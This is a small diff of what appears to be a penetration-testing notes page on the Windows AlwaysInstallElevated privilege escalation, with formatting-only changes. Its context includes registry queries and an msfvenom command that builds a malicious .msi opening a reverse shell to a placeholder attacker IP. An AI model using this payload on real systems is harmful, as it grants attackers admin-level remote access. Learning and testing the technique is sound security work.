@@ -8,8 +8,6 @@ title: AlwaysInstallElevated
 
 However, they can be Configured to run with Higher Privileges from any User Account <span style={{fontWeight: 'Bold'}}>(Even Unprivileged Ones).</span> We can Potentially generate a Malicious <b style={{ color: 'Plum' }}>[.msi]</b> File that would run with Admin Privileges.
 
----
-
 <br/>
 
 - This method Requires Two <b style={{ color: 'DeepSkyBlue' }}>Registry</b> Values to be set.
@@ -19,7 +17,9 @@ C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
 C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 ```
 
-- **PAYLOAD**
+<br/>
+
+### PAYLOAD
 
 ```js
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
